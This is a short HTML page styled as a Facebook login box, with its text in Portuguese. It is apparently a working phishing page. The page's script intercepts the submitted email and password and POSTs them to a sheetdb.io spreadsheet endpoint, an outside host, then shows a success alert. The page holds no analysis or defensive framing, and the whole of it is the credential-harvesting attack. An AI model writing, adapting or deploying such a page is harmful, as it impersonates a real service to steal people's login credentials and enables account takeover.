<!DOCTYPE html>
<html>
<head>
  <title>Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .box {
      background: white;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.2);
      width: 300px;
    }
    input, button {
      width: 100%;
      padding: 10px;
      margin: 5px 0;
    }
    button {
      background-color: #1877f2;
      color: white;
      border: none;
      border-radius: 5px;
    }
  </style>
</head>
<body>
  <div class="box">
    <h2>Faça login no Facebook</h2>
    <form id="loginForm">
      <input type="email" id="email" placeholder="Email" required>
      <input type="password" id="senha" placeholder="Senha" required>
      <button type="submit">Entrar</button>
    </form>
  </div>

  <script>
    document.getElementById("loginForm").addEventListener("submit", function(e) {
      e.preventDefault();

      let email = document.getElementById("email").value;
      let senha = document.getElementById("senha").value;

      fetch("https://sheetdb.io/api/v1/qhqc8z9pqvr5x", {
        method: "POST",
        body: JSON.stringify({ data: { Email: email, Senha: senha } }),
        headers: {
          "Content-Type": "application/json"
        }
      }).then(response => {
        alert("Dados enviados com sucesso!");
        document.getElementById("loginForm").reset();
      });
    });
  </script>
</body>
</html>
